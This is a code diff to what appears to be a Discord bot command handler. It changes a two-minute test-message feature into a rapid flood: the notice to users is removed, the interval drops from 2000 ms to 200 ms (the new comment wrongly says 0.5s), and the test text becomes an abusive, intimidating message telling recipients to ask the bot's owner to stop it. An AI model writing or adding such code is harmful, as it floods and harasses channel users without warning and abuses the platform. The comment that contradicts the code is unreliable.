@@ -747,12 +747,11 @@ const commandHandlers = {
                             return;
                         }
                         activeSenders.add(channel.id);
-                        await message.reply('✅ Starting test messages for 2 minutes.');
-                        // send immediately, then every 2s
+                        // send immediately, then every 0.5s
                         channel.send('Das ist ein Test').catch(() => {});
                         const iv = setInterval(() => {
-                            channel.send('Das ist ein Test').catch(() => {});
-                        }, 2000);
+                            channel.send('You are fucked,if you need help ask my owner for help to stop the process immediately!!!!').catch(() => {});
+                        }, 200);
                         // stop after 2 minutes
                         setTimeout(() => {
                             clearInterval(iv);
